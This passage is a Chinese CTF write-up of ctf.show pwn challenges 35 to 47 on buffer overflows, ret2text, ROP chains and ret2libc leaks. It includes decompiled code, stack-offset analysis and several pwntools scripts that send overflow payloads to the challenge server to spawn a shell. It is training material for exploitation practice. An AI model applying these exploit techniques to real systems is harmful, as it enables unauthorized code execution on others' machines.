  stream = fopen("/ctfshow_flag", (const char *)&unk_8048904);
  if ( !stream )
  {
    puts("/ctfshow_flag: No such file or directory.");
    exit(0);
  }
  fgets(flag, 64, stream);
  signal(11, (__sighandler_t)sigsegv_handler);
  v3 = getegid();
  setresgid(v3, v3, v3, v5, v6, v7, v3);
  puts((const char *)&unk_8048940);
  puts((const char *)&unk_80489B4);
  puts((const char *)&unk_8048A30);
  puts((const char *)&unk_8048ABC);
  puts((const char *)&unk_8048B4C);
  puts((const char *)&unk_8048BD0);
  puts((const char *)&unk_8048C64);
  puts("    * *************************************                           ");
  puts((const char *)&unk_8048D28);
  puts("    * Type  : Linux_Security_Mechanisms                               ");
  puts("    * Site  : https://ctf.show/                                       ");
  puts("    * Hint  : No canary found                                         ");
  puts("    * *************************************                           ");
  puts("How to input ?");
  if ( argc > 1 )
    ctfshow((char *)argv[1]);
  return 0;
```

```bash
char *__cdecl ctfshow(char *src)
{
  char dest; // [esp+Ah] [ebp-3Eh]

  return strcpy(&dest, src);
}
```

注意其中有一段代码是fgets(flag, 64, stream);

说明将flag存储到stream中，然后通过这个获取到全局变量flag中。

找到dest数组，发现这个数组有58位的同时并没有输出溢出的控制

说明可以构造缓冲区溢出的漏洞

直接构造一个大于dest数组的输入，使得dest复制后覆盖了之后的地址

# 栈溢出

## 35

```bash
int __cdecl main(int argc, const char **argv, const char **envp)
{
  FILE *stream; // [esp+0h] [ebp-1Ch]

  stream = fopen("/ctfshow_flag", (const char *)&unk_80488D4);
  if ( !stream )
  {
    puts("/ctfshow_flag: No such file or directory.");
    exit(0);
  }
  fgets(flag, 64, stream);
  signal(11, (__sighandler_t)sigsegv_handler);
  puts((const char *)&unk_8048910);
  puts((const char *)&unk_8048984);
  puts((const char *)&unk_8048A00);
  puts((const char *)&unk_8048A8C);
  puts((const char *)&unk_8048B1C);
  puts((const char *)&unk_8048BA0);
  puts((const char *)&unk_8048C34);
  puts("    * *************************************                           ");
  puts((const char *)&unk_8048CF8);
  puts("    * Type  : Stack_Overflow                                          ");
  puts("    * Site  : https://ctf.show/                                       ");
  puts("    * Hint  : See what the program does!                              ");
  puts("    * *************************************                           ");
  puts("Where is flag?\n");
  if ( argc <= 1 )
  {
    puts("Try again!");
  }
  else
  {
    ctfshow((char *)argv[1]);
    printf("QaQ!FLAG IS NOT HERE! Here is your input : %s", argv[1]);
  }
  return 0;
}
```

```bash
char *__cdecl ctfshow(char *src)
{
  char dest; // [esp+Ch] [ebp-6Ch]

  return strcpy(&dest, src);
}
```

signal函数**为指定的 “信号（程序运行时的异常 / 事件）” 绑定一个 “处理函数”**<font style="color:rgba(0, 0, 0, 0.85);">。当程序收到该信号时，会暂停当前执行，转而执行绑定的处理函数。</font>

<font style="color:rgba(0, 0, 0, 0.85);">其中的11代表着</font><font style="color:rgba(0, 0, 0, 0.85);background-color:rgba(0, 0, 0, 0.06);">SIGSEGV（段错误）</font><font style="color:rgba(0, 0, 0, 0.85);">的信号</font>

这个信号当程序试图访问 “非法内存地址” 时触发，比如：

* 访问未分配的内存（如 `NULL` 指针解引用）；
* 访问超出数组 / 缓冲区边界的内存（如你之前的缓冲区溢出）；
* 访问只读内存（如修改字符串常量）。

这里注意到如下代码：

```bash
fgets(flag, 64, stream);
signal(11, (__sighandler_t)sigsegv_handler);
```

从指定的输入流 stream 中读取最多 63 个字符（因为最后一个位置留给了空字符 '\0'）到名为 flag 的字符数组中；当程序执行中发生段错误时，会触发 SIGSEGV 信号，此时程序会自动调用 sigsegv\_handler 函数进行处理。

说明在段错误的时候会出发这个函数，直接看一下这个sigsegv\_handler 函数

```bash
void __noreturn sigsegv_handler()
{
  fprintf(stderr, (const char *)&unk_80488D0, flag);
  fflush(stderr);
  exit(1);
}
```

其中stderr是错误输出流，(const char \*)\&unk\_80488D0推测应该是`"%s\n"` 或 `"%s"`

直接点进这个内存看一下，发现是`%s`

确实是输出

fflush强制刷新标准错误流（`stderr`）的输出缓冲区，确保 `flag` 内容在程序退出前被立即打印到终端

![1763352020826-9f7153bf-442e-4844-940a-b06dd9399ace.png](./img/I9qdj-CFnaq3QouQ/1763352020826-9f7153bf-442e-4844-940a-b06dd9399ace-090228.png)

直接输出一个超长的字符串进去就行了

## 36

```bash
int __cdecl main(int argc, const char **argv, const char **envp)
{
  setvbuf(stdout, 0, 2, 0);
  puts((const char *)&unk_804883C);
  puts((const char *)&unk_80488B0);
  puts((const char *)&unk_804892C);
  puts((const char *)&unk_80489B8);
  puts((const char *)&unk_8048A48);
  puts((const char *)&unk_8048ACC);
  puts((const char *)&unk_8048B60);
  puts("    * *************************************                           ");
  puts((const char *)&unk_8048C24);
  puts("    * Type  : Stack_Overflow                                          ");
  puts("    * Site  : https://ctf.show/                                       ");
  puts("    * Hint  : There are backdoor functions here!                      ");
  puts("    * *************************************                           ");
  puts("Find and use it!");
  puts("Enter what you want: ");
  ctfshow();
  return 0;
}
```

`setvbuf(stdout, 0, 2, 0);`<font style="color:rgba(0, 0, 0, 0.85);">作用是 </font>**禁用标准输出（stdout）的缓冲**<font style="color:rgba(0, 0, 0, 0.85);">，让</font><code><font style="color:rgba(0, 0, 0, 0.85);">printf</font></code><font style="color:rgba(0, 0, 0, 0.85);">、</font><code><font style="color:rgba(0, 0, 0, 0.85);">puts</font></code><font style="color:rgba(0, 0, 0, 0.85);">等输出函数的内容 “实时打印”，而非缓存后批量输出</font>

```bash
char *ctfshow()
{
  char s; // [esp+0h] [ebp-28h]

  return gets(&s);
}
```

```bash
char *gets(char *s)
{
  return gets(s);
}
```

gets函数是循环调用，所以存在栈空间溢出的可能性

然后查看一下可以调用那些函数

![1763372932890-0b77da02-1395-4301-9711-72b05def20be.png](./img/I9qdj-CFnaq3QouQ/1763372932890-0b77da02-1395-4301-9711-72b05def20be-207742.png)

发现其中有一个函数叫做get\_flag

点看这个函数看一下

```bash
int get_flag()
{
  char s; // [esp+Ch] [ebp-4Ch]
  FILE *stream; // [esp+4Ch] [ebp-Ch]

  stream = fopen("/ctfshow_flag", (const char *)&unk_8048800);
  if ( !stream )
  {
    puts("/ctfshow_flag: No such file or directory.");
    exit(0);
  }
  fgets(&s, 64, stream);
  return printf(&s);
}
```

这个函数命名没有调用，但是却出现了，是个后门

在调用里面可以看见他的位置

get\_flag	08048586

```bash
from pwn import *
p = remote('pwn.challenge.ctf.show', 28250)
payload = b'a'*(0x28+4) + p32(0x8048586)
p.sendline(payload)
p.interactive()
```

#### `p = remote('pwn.challenge.ctf.show', 28250)`

* 建立与目标服务器的 TCP 连接：
  * `remote(host, port)`：`pwntools` 的核心函数，用于连接远程 Pwn 题服务；
  * `host`：目标服务器域名 `pwn.challenge.ctf.show`（CTF Show 平台的 Pwn 题专用域名）；
  * `port`：端口号 `28250`（每个题目对应唯一端口）；
  * 变量 `p` 是连接句柄，后续通过 `p.sendline()` 发数据、`p.recv()` 收数据。

#### `payload = b'a'*(0x28+4) + p32(0x8048586)`

这是 **栈溢出 payload 的核心构造**，原理是 “覆盖栈上的返回地址”

#### `p.sendline(payload)`

* 向目标程序发送构造好的 payload（`sendline()` 会在 payload 末尾自动添加换行符 `\n`，适配题目中 “读取一行输入” 的场景，如 `scanf("%s", buf)` 或 `read(0, buf, size)`）；
* 若题目是 “读取指定长度字节” 而非 “读一行”，需用 `p.send(payload)`（不添加换行符）。

#### <font style="color:rgb(0, 0, 0);"></font>`p.interactive()`

* 进入交互模式，将本地终端与目标程序的输入 / 输出绑定，此时可以像操作本地 shell 一样输入命令（如 `ls`、`cat flag`），获取 flag 或进一步操作。

### 计算偏移量

```bash
-00000028 s               db ?
-00000027                 db ? ; undefined
-00000026                 db ? ; undefined
-00000025                 db ? ; undefined
-00000024                 db ? ; undefined
-00000023                 db ? ; undefined
-00000022                 db ? ; undefined
-00000021                 db ? ; undefined
-00000020                 db ? ; undefined
-0000001F                 db ? ; undefined
-0000001E                 db ? ; undefined
-0000001D                 db ? ; undefined
-0000001C                 db ? ; undefined
-0000001B                 db ? ; undefined
-0000001A                 db ? ; undefined
-00000019                 db ? ; undefined
-00000018                 db ? ; undefined
-00000017                 db ? ; undefined
-00000016                 db ? ; undefined
-00000015                 db ? ; undefined
-00000014                 db ? ; undefined
-00000013                 db ? ; undefined
-00000012                 db ? ; undefined
-00000011                 db ? ; undefined
-00000010                 db ? ; undefined
-0000000F                 db ? ; undefined
-0000000E                 db ? ; undefined
-0000000D                 db ? ; undefined
-0000000C                 db ? ; undefined
-0000000B                 db ? ; undefined
-0000000A                 db ? ; undefined
-00000009                 db ? ; undefined
-00000008                 db ? ; undefined
-00000007                 db ? ; undefined
-00000006                 db ? ; undefined
-00000005                 db ? ; undefined
-00000004 var_4           dd ?
+00000000  s              db 4 dup(?)
+00000004  r              db 4 dup(?)
```

开头的`s`是ctfshow函数中的s数组。

<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0.06);">s db 4 dup(?)</font><font style="color:rgba(0, 0, 0, 0.85);">是 </font>**保存的旧 EBP**<font style="color:rgba(0, 0, 0, 0.85);">（也叫 “栈底指针备份”）！</font>`4 dup(?)`<font style="color:rgba(0, 0, 0, 0.85);"> 表示 4 字节（32 位程序 EBP 是 4 字节），</font>`s`<font style="color:rgba(0, 0, 0, 0.85);"> 是 IDA 对 “保存的 EBP” 的默认命名（栈帧切换时会把上一层 EBP 压栈保存）。</font>

<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0.06);">r db 4 dup(?)</font><font style="color:rgba(0, 0, 0, 0.85);">是 </font>**返回地址（EIP）**<font style="color:rgba(0, 0, 0, 0.85);">！</font>`4 dup(?)`<font style="color:rgba(0, 0, 0, 0.85);"> 表示 4 字节（32 位程序 EIP 是 4 字节），</font>`r`<font style="color:rgba(0, 0, 0, 0.85);"> 是 IDA 对 “返回地址” 的默认命名（函数执行完 </font>`ret`<font style="color:rgba(0, 0, 0, 0.85);"> 指令时，会从这里取出地址跳转）。</font>

<font style="color:rgba(0, 0, 0, 0.85);">原理就是输出一直到覆盖返回地址，从返回到原函数变成了返回到get\_flag函数。</font>

<font style="color:rgba(0, 0, 0, 0.85);">所以可以写一个python</font>

```bash
from pwn import *
p = remote('pwn.challenge.ctf.show', 28250)
payload = b'a'*(0x28+4) + p32(0x8048586)	
p.sendline(payload)
p.interactive()
```

关键的是`payload = b'a'*(0x28+4) + p32(0x8048586)`

其中为什么是0x28+4的原因就是之前的分布中从s数组到r的距离\_ 0x28+4就是0x2c\_

p32是32位系统中的2进制打包的地址

![1763375698623-c6ec5a1b-eba1-4a24-85e6-06de597e7289.png](./img/I9qdj-CFnaq3QouQ/1763375698623-c6ec5a1b-eba1-4a24-85e6-06de597e7289-323073.png)

直接python程序连接就可以

注意只能用程序输入，因为他输入进去的内容是2进制的，我们的输入在地址的位置会输错

## 37

```bash
int __cdecl main(int argc, const char **argv, const char **envp)
{
  init();
  logo();
  puts("Just very easy ret2text&&32bit");
  ctfshow();
  puts("\nExit");
  return 0;
}
```

这个就是主函数，按shift+F12查看字符串

![1763376882554-59ba462c-5e66-4f49-96bf-f1c07efef614.png](./img/I9qdj-CFnaq3QouQ/1763376882554-59ba462c-5e66-4f49-96bf-f1c07efef614-321254.png)

其中有/bin/sh

直接找到位置查看一下这个是什么东西

![1763376938129-18cf9c9e-1ea9-4b05-a009-855b90d51cb0.png](./img/I9qdj-CFnaq3QouQ/1763376938129-18cf9c9e-1ea9-4b05-a009-855b90d51cb0-854552.png)

发现backdoor函数，找到backdoor函数

ctrl+p打开跳转窗口，找到backdoor函数地址

![1763377773053-dd8c1a6f-f59b-4414-b159-58dd2d446bb0.png](./img/I9qdj-CFnaq3QouQ/1763377773053-dd8c1a6f-f59b-4414-b159-58dd2d446bb0-988846.png)

直接更改ctfshow函数使得他不跳转回到主函数，而是回到backdoor函数

<code><font style="color:rgba(0, 0, 0, 0.85);">context.log_level = 'debug'</font></code><font style="color:rgba(0, 0, 0, 0.85);"> 是 </font>**pwntools 库**<font style="color:rgba(0, 0, 0, 0.85);">中的核心配置，作用是 </font>**开启 “调试日志模式”**

```bash
from pwn import *
context.log_level ='debug'
p = remote('pwn.challenge.ctf.show', 28207)
payload = b'a'*(0x12+4) + p32(0x8048521)
p.sendline(payload)
p.interactive()
```

## 38

他都告诉你了，64位的，所以过程同上

记得把函数里面改一下就成

### 堆栈平衡：

当我们在堆栈中进行堆栈的操作的时候，一定要保证在 ret 这条指令之前，esp 指向的是我们压入栈中的地址，函数执行到 ret 执行之前，堆栈栈顶的地址 一定要是 call 指令的下一个地址。

```bash
from pwn import *
context.log_level = 'debug'
p = remote('pwn.challenge.ctf.show', 28189)
payload = b'a'*(0xA+8) + p64(0x40065B) + p64(0x400657)
p.sendline(payload)
p.interactive()
```

esp（指向函数栈的栈顶）是在主函数中更改的，所以如果直接返回到backdoor函数的话会跳转到没有增加的esp的地方，导致栈顶错误，所以应该在执行函数前先将栈退一位，在之后再进行执行子函数的时候进一位的时候保证正确。

## 39

先下载，在函数里找字符串

![1763433117222-551ea9b7-c23b-4fd4-9bd7-8671fe8a53f1.png](./img/I9qdj-CFnaq3QouQ/1763433117222-551ea9b7-c23b-4fd4-9bd7-8671fe8a53f1-642949.png)

找到/bin/sh字符，跟进找到hint函数

![1763433132596-cfb1d1d5-7263-4ca8-9a2c-91a303f3cc0b.png](./img/I9qdj-CFnaq3QouQ/1763433132596-cfb1d1d5-7263-4ca8-9a2c-91a303f3cc0b-551134.png)

查看hint函数源代码

```bash
int hint()
{
  puts("/bin/sh");
  return system("echo 'You find me?'");
}
```

然后再看一眼ctfshow函数源代码

```bash
ssize_t ctfshow()
{
  char buf; // [esp+6h] [ebp-12h]

  return read(0, &buf, 0x32u);
}
```

发现buf长度为14，但是read函数获取的长度是0x32位

所以read获取的函数会覆盖buf在函数栈帧的返回

但是注意在hint函数中`/bin/sh`和`system`两个是分开的，所以需要手动构造函数

注意这里函数的调用是在<font style="color:rgb(0, 0, 0);">POSIX中的execve系统调用，长下面这个样子：</font>

```cpp
int execve(const char* pathname, char* const argv[], char* const envp[]);
```

所以system函数隐形的逻辑是

```cpp
char* const argv[] = {"/bin/sh", "-c", "echo hello", NULL};
execve("/bin/sh", argv, NULL);
```

所以在构建payload的时候需要注意空出来一个位置再加上`/bin/sh`

shift+f3找到function window（函数窗口）找到system地址

注意是.system的地址而非system的地址

一般都是在plt表中，在静态分析的时候plt表中的内容不变，动态跑起来后会自动跳转到真实的位置

`/bin/sh`在rodata中，也是静态的

```python
from pwn import *
context.log_level = 'debug'
p = remote('pwn.challenge.ctf.show', 28189)
payload = b'a'*(0x12+4) + p32(0x0804A014) + p32(0) +p32(0x08048750)
p.sendline(payload)
p.interactive()
```

## 40

64位的

![1763436046768-b1150316-6013-4adb-a701-e26f6814db5f.png](./img/I9qdj-CFnaq3QouQ/1763436046768-b1150316-6013-4adb-a701-e26f6814db5f-806706.png)

所以payload应该是0xA+8

<font style="color:rgb(77, 77, 77);">64位和32位不同，参数</font>**<font style="color:rgb(77, 77, 77);">不是直接放在栈上</font>**<font style="color:rgb(77, 77, 77);">，而是</font>**<font style="color:rgb(77, 77, 77);">优先放在寄存器rdi,rsi,rdx,rcx,r8,r9</font>**<font style="color:rgb(77, 77, 77);">。这几个</font><font style="color:rgb(78, 161, 219) !important;">寄存器</font><font style="color:rgb(77, 77, 77);">放不下时才会考虑栈</font>

最稳的办法：在二进制里找一个**对某函数的真实调用点**（比如某处 `call system@plt` 或 `call puts@plt`），看它在 `call` 前把参数放哪里。

<font style="color:rgb(77, 77, 77);">在 IDA/Ghidra 里看：</font>

* <font style="color:rgb(77, 77, 77);">找到 </font><code><font style="color:rgb(77, 77, 77);">call _system</font></code><font style="color:rgb(77, 77, 77);"> 这类位置（PLT 调用点）</font>
* <font style="color:rgb(77, 77, 77);">向上看几行：你会看到类似</font>
  * <font style="color:rgb(77, 77, 77);">SysV：</font><code><font style="color:rgb(77, 77, 77);">mov rdi, xxx</font></code><font style="color:rgb(77, 77, 77);"> / </font><code><font style="color:rgb(77, 77, 77);">lea rdi, [rip+...]</font></code>
  * <font style="color:rgb(77, 77, 77);">Windows：</font><code><font style="color:rgb(77, 77, 77);">mov rcx, xxx</font></code>
* <font style="color:rgb(77, 77, 77);">这就直接告诉你：这个二进制遵循哪套约定，以及</font>**参数寄存器是哪一个**<font style="color:rgb(77, 77, 77);">。</font>

<font style="color:rgb(77, 77, 77);">在 gdb 里验证（更直接）：</font>

* <font style="color:rgb(77, 77, 77);">在 </font><code><font style="color:rgb(77, 77, 77);">system@plt</font></code><font style="color:rgb(77, 77, 77);"> 下断点</font>
* <font style="color:rgb(77, 77, 77);">程序跑到断点时看寄存器：</font>
  * <font style="color:rgb(77, 77, 77);">Linux：</font><code><font style="color:rgb(77, 77, 77);">info reg rdi rax</font></code>
  * <font style="color:rgb(77, 77, 77);">Windows：看 </font><code><font style="color:rgb(77, 77, 77);">rcx rax</font></code>
* <font style="color:rgb(77, 77, 77);">你会发现参数确实在对应寄存器里。</font>

先找 `system@plt` 地址（任一即可）：

```plain
info functions system
# 或者
disassemble main
```

<font style="color:rgb(77, 77, 77);">如果你看到有 </font><code><font style="color:rgb(77, 77, 77);">system@plt</font></code><font style="color:rgb(77, 77, 77);">，可以直接：</font>

```plain
break *system@plt
run
```

<font style="color:rgb(77, 77, 77);">程序停住后：</font>

```plain
info registers rdi rsi rdx rcx r8 r9 rax
x/s $rdi
x/i $rip
bt
```

<font style="color:rgb(77, 77, 77);">你会看到：</font>

* <code><font style="color:rgb(77, 77, 77);">$rdi</font></code><font style="color:rgb(77, 77, 77);"> 里就是要传给 system 的字符串地址</font>
* <code><font style="color:rgb(77, 77, 77);">x/s $rdi</font></code><font style="color:rgb(77, 77, 77);"> 能把它当 C 字符串打印出来（例如 "echo ..." 或 "/bin/sh"）</font>

<font style="color:rgb(77, 77, 77);">这就证明：</font>**system 的第 1 参数 = RDI**<font style="color:rgb(77, 77, 77);">（Linux x86-64 SysV）。</font>

使用ROPgadget查找rdi

```python
ROPgadget --binary pwn --only "pop|ret" | grep rdi
```

给出paylaod

```python
payload = b'a'*(0xA+8) + p64(pop_rdi) + p64(bin_sh)  + p64(ret) + p64(system)
```

0xA+8个填充字节（用'a'填充）：用于填充到栈溢出的位置，达到返回地址的偏移。

pop\_rdi：用于将下一个值弹出到rdi寄存器中。

bin\_sh：需要执行的系统命令字符串的地址。这里就是`/bin/sh`直接弹出到rdi中

ret：用于绕过栈中的返回地址，返回到调用者。确保esp指向的值是对的

system：系统函数system的地址，用于执行系统命令。因为是单参数，所以执行的是寄存器中的参数

注意一下找的ret要求是**不依赖任何栈帧状态、仅包含 **<code>**ret**</code>** 一条指令**<font style="color:rgba(0, 0, 0, 0.85);"> 的汇编片段</font>

```bash
ROPgadget --binary pwn --only "ret"
```

这里需要记住\_system函数的参数是rdi，需要弹出rdi，同时pop\_rdi这条指令会把后面的地址直接放进rdi中间，所以可以把结果直接放进去。

## 41

没有/bin/sh函数，但是有其他函数

```bash
int useful()
{
  return printf("sh");
}
```

其中sh指向一个在环境变量中定义过的值，所以同样可以调用

只需要将system的参数指定为useful这个函数的sh就可以了

当通过栈溢出劫持执行流时，我们是直接让程序 `ret` 到 `system` 函数（相当于跳过了 `call system` 指令）。而 `call system` 会自动做两件事：

1. 把当前的下一条指令地址压栈（作为 `system` 的返回地址）；
2. 跳转到 `system` 函数入口。

但我们的 payload 是用 `p32(system)` 覆盖了原函数的返回地址，程序执行 `ret` 时会直接跳去 `system`，**没有执行**\*\* **<code>**call**</code>** \*\*\*\*指令，所以栈上没有自动压入 “返回地址”\*\*。

此时 `system` 函数执行时，会默认从栈中读取参数和返回地址，栈结构需要手动构造为：

| **栈地址（高→低）** | **内容** | **说明** |
| :--- | :--- | :--- |
| ... | `/bin/sh`<br/> 的地址 | system 的第 1 个参数（ESP+8 位置） |
| ESP+4 | 0（占位符） | 对应 `system`<br/> 的 “返回地址” 位置（ESP+4） |
| ESP | 原函数的返回地址被覆盖 | 已被 `p32(system)`<br/> 替换，程序跳去 system |

返回地址是空的话就可以忽略call的步骤

```bash
payload=b'a'*(0x12+4)+p32(system)+p32(0)+p32(sh)
```

额，应该是对的，但是不知道为什么ctfshow的nc连接连不上了

## 42

先试着自己推测一下，看眼上面的payload

```bash
payload=b'a'*(0x12+4)+p32(system)+p32(0)+p32(sh)
```

改成64位的传参位置会有所变化，先把sh压进rbi，然后ret，最后system

```bash
payload=b'a'*(0xA+8)+p64(rdi)+p64(sh)+p64(ret)+p64(system)

payload=b'a'*(0xA+8)+p64(0x400843)+p64(0x400872)+p64(0x400542)+p64(0x400560)
```

对了

## 43

题目中没有/bin/sh命令，需要自己找地方输入这个东西

使用gdb打开这段程序，设置断点在main函数中

```bash
gdb pwn     //打开gdb
break main  //设置断点在main函数处
run         //执行程序
vmmap       //产看内存分布图
```

![1763465889677-55d34e05-87d2-47f4-851e-d3b96ee47621.png](./img/I9qdj-CFnaq3QouQ/1763465889677-55d34e05-87d2-47f4-851e-d3b96ee47621-692709.png)

这个是执行程序后的部分

![1763465978052-aba59ed5-6099-4277-8431-2870a5c4cc42.png](./img/I9qdj-CFnaq3QouQ/1763465978052-aba59ed5-6099-4277-8431-2870a5c4cc42-697230.png)

这个是内存分布图

rw-p 表示这段内存（0x804b000 到 0x804c000）是可读写的；

-p 标志表示内存区域的权限，它由四个字符组成，每个字符分别代表一个权限：

r：可读（Readable）

w：可写（Writable）

x：可执行（Executable）

s：共享（Shared）

![1763466106610-cc455811-2e77-4551-b16e-0ea00ec961f9.png](./img/I9qdj-CFnaq3QouQ/1763466106610-cc455811-2e77-4551-b16e-0ea00ec961f9-825227.png)

找到一个函数是可以用的直接借用这个函数

所以给出payload

```bash
payload = b'a'*(0x6C+4) + p32(gets) + p32(system) + p32(buf2) + p32(buf2)


from pwn import *
context.log_level = 'debug'
p = remote('pwn.challenge.ctf.show', 28227)
payload = b'a'*(0x6C+4) + p32(0x0804B0C8) + p32(0x08048450) + p32(0x0804B060) + p32(0x0804B060)
p.sendline(payload)
p.sendline("/bin/sh")
p.interactive()
```

这个system返回地址指向的是变量的内存空间，根本不能返回到这里

汇编语言的规定是先写函数，然后写函数的返回地址，然后写函数的参数

## 44

就是把上一道一题目改成64位就行了，只要两个函数依次执行就行

```bash
payload=offset+p64(rdi)+p64(buf2)+p64(ret)+p(gets)+p64(rdi)+p64(buf2)+p64(ret)+p(system)
```

elf.plt、elf.got、elf.sym的用法

```bash
elf.plt['symbol_name']: 获取指定符号在PLT（Procedure Linkage Table）中的地址。PLT用于间接调用共享库中的函数。
elf.got['symbol_name']: 获取指定符号在GOT（Global Offset Table）中的地址。GOT保存了动态链接库函数的实际地址。
elf.sym['symbol_name']: 获取指定符号在ELF文件中的地址。可以是函数或变量。
```

## 45

注意一下这道题目，根本没有system这个函数可以给你使用，但是可以使用他们相同的libc库

因为libc库中有已经使用过的函数泄露，这道题目中有write函数泄露，我们就可以直接通过计算偏移值来计算出system的位置，然后直接结算出来get的位置，直接输入

```python
int __cdecl main(int argc, const char **argv, const char **envp)
{
  init(&argc);
  logo();
  puts("O.o?");
  ctfshow();
  write(0, "Hello CTFshow!\n", 0xEu);
  return 0;
}
```

```python
# -*- coding: utf-8 -*-

from pwn import *

elf_path = './pwn'
elf = ELF(elf_path)
# 加载ELF（可执行和可链接格式）二进制文件到elf对象中，使我们能够轻松访问符号、地址和段

p = remote('pwn.challenge.ctf.show', 28188)

offset = 0x6B + 4
puts_plt = elf.plt['puts']#这里面的puts是程序自己定义的函数，但是实际上是调用libc库的puts
puts_got = elf.got['puts']
ctfshow = elf.sym['ctfshow']#程序中返回的下一个地址

payload = flat([cyclic(offset), puts_plt, ctfshow, puts_got])
#这个里面plt是put的地址，got是put的参数，ctfshow是返回的地址
#  flat函数将各个部分打平成一个字节序列
# 先调用puts函数并输出puts函数的实际地址（从GOT中获取），然后返回到ctfshow函数继续执行
p.sendline(payload)

puts_real = u32(p.recvuntil(b'\xf7')[-4:])
# 接收数据，直到遇到字节\xf7（在32位系统中，很多共享库（如libc）的地址高字节是\xf7）
# 取接收到的数据的最后 4 个字节，因为 puts 函数的地址是 32 位（4 个字节）
# 泄露 puts 函数在 GOT 表中的实际地址

libc = ELF("/home/ctfshow/libc/32bit/libc-2.27.so")
# 加载 libc 库
libc.address = puts_real - libc.symbols['puts']
# libc.symbols['puts'] 是 puts 函数在 libc 文件中的偏移地址，减去这个偏移地址，我们可以得到 libc 库在运行时的基地址

system = libc.symbols['system']
bin_sh = next(libc.search(b'/bin/sh'))
# 如果没有计算出 libc.address，那么 libc.symbols['system'] 和 libc.search(b'/bin/sh') 等操作将返回 libc 库中相应函数或字符串的偏移地址，而不是实际的内存地址

payload2 = flat([cyclic(offset), system, 0x0, bin_sh])
# 0x0作为占位符填充返回地址的后续字节，以确保返回地址被正确覆盖
p.sendline(payload2)

p.interactive()
```

## 46

这一道题目先看一下ctfshow函数

```plain
ssize_t ctfshow()
{
  _BYTE buf[112]; // [rsp+0h] [rbp-70h] BYREF

  return read(0, buf, 0xC8u);//200个
}
```

所以可以注入

<font style="color:rgb(77, 77, 77);">write函数的原型为：</font>\*\*<font style="color:rgb(77, 77, 77);">ssize\_t write(int fd, const void *buf, size\_t count);</font>*\*

<font style="color:rgb(79, 79, 79);background-color:rgb(238, 240, 244);">在调用</font><font style="color:rgb(79, 79, 79);background-color:rgb(238, 240, 244);"> </font><code><font style="color:rgb(79, 79, 79);background-color:rgb(238, 240, 244);">write</font></code><font style="color:rgb(79, 79, 79);background-color:rgb(238, 240, 244);"> </font><font style="color:rgb(79, 79, 79);background-color:rgb(238, 240, 244);">时：</font>

* <code><font style="color:rgb(51, 51, 51);background-color:rgb(238, 240, 244);">rdi</font></code><font style="color:rgb(51, 51, 51);background-color:rgb(238, 240, 244);">：文件描述符（如 1 表示标准输出）</font>
* <code><font style="color:rgb(51, 51, 51);background-color:rgb(238, 240, 244);">rsi</font></code><font style="color:rgb(51, 51, 51);background-color:rgb(238, 240, 244);">：缓冲区地址（如</font><font style="color:rgb(51, 51, 51);background-color:rgb(238, 240, 244);"> </font><code><font style="color:rgb(51, 51, 51);background-color:rgb(238, 240, 244);">write_got</font></code><font style="color:rgb(51, 51, 51);background-color:rgb(238, 240, 244);">）</font>
* <code><font style="color:rgb(51, 51, 51);background-color:rgb(238, 240, 244);">rdx</font></code><font style="color:rgb(51, 51, 51);background-color:rgb(238, 240, 244);">：要写入的字节数</font>

所以需要先构建一个write

```plain
payload = b'A' * offset + p64(pop_rdi) + p64(1)
payload += p64(pop_rsi_r15) + p64(got_write) + p64(0)
payload += p64(ple_write) + p64(main)
```

```python
ROPgadget --binary pwn --only "pop|ret"
```

pop\_rdi=0x400803

pop\_rsi\_r15=0x400801

接着就是寻找plt和got表地址了，这里我们通过write函数来进行泄露，需要注意的是，64位程序和32位程序在这上面有些许不同。

```python
ple_write = elf.plt['write']
got_write = elf.got['write']
main = elf.symbols['main']
```

write函数的原型为：ssize\_t write(int fd, const void \*buf, size\_t count);

在调用 write 时：

1.rdi：文件描述符（如 1 表示标准输出）

2.rsi：缓冲区地址（如 write\_got）

3.rdx：要写入的字节数

```python
payload = b'A' * offset + p64(pop_rdi) + p64(1)
payload += p64(pop_rsi_r15) + p64(got_write) + p64(0)
payload += p64(ple_write) + p64(main)
```

* **PLT（Procedure Linkage Table）**：程序里一段“跳板代码”，你调用 `write@plt` 时会先跳到这里，由它负责“去找真正的 write 在哪儿”。
* **GOT（Global Offset Table）**：程序里一张“指针表”，里面存着**真实函数地址**（比如 libc 的 `write` 地址）。PLT 最终会让 GOT 的某个槽位写入真实地址。

为什么没有找到pop\_rdx的地址呢？

如果 write 的输出目标是标准输出（fd = 1），而 write\_got 指向的地址有效，即使 rdx 的值不精确，程序可能仍然会输出部分数据（例如，GOT 表中的 8 字节）。

在某些情况下，write 函数可能不会严格检查 count 参数，或者即使 count 是一个较大的值，输出仍然会成功（只要不触发内存访问错误）。

然后求一下基址相关的`rdi`，`rsi`等就行了

![1766399023948-77ef2cc4-f364-466b-b174-0d8bf4aba80e.png](./img/I9qdj-CFnaq3QouQ/1766399023948-77ef2cc4-f364-466b-b174-0d8bf4aba80e-066689.png)

问题来了，我并不知道他的libc是什么

直接上<https://libc.blukat.me/>搜索偏移地址看一下能不能找到，但是发现所有的五个文件都不行，那就点了，投降

## 47

```python
int __cdecl main(int argc, const char **argv, const char **envp)
{
  setvbuf(stdout, 0, 2, 0);
  logo(&argc);
  puts("Give you some useful addr:\n");
  printf("puts: %p\n", &puts);
  printf("fflush %p\n", &fflush);
  printf("read: %p\n", &read);
  printf("write: %p\n", &write);
  printf("gift: %p\n", useful);
  putchar(10);
  ctfshow();
  return 0;
}
```

直接把这些鬼东西的地址作为礼物送给你了，这还不直接做出来

那么直接写一个程序获取输出

```python
from pwn import *
import re

context(os='linux', arch='i386')
context.log_level = 'info'

HOST = 'pwn.challenge.ctf.show'
PORT = 28290

io = remote(HOST, PORT)

# 直接把当前能收到的所有输出都读出来（不做结构化处理）
data = io.recvrepeat(1.5)  # 1.5 秒内持续接收，直到暂时没有新数据
try:
    # 如果服务还在继续输出，再补一次（可按需删掉）
    data += io.recvrepeat(0.8)
except EOFError:
    pass

# 原样打印全部接收内容（保持字节安全）
print(data.decode(errors="replace"), end="")

# 正则提取所有 0x... 地址（包含 32/64 位都能匹配）
addr_pat = re.compile(rb'0x[0-9a-fA-F]+')
addrs = addr_pat.findall(data)

# 去重但保序
seen = set()
uniq = []
for a in addrs:
    if a not in seen:
        seen.add(a)
        uniq.append(a)

log.info("Extracted addresses:")
for a in uniq:
    log.success(hex(int(a, 16)))

io.close()

```

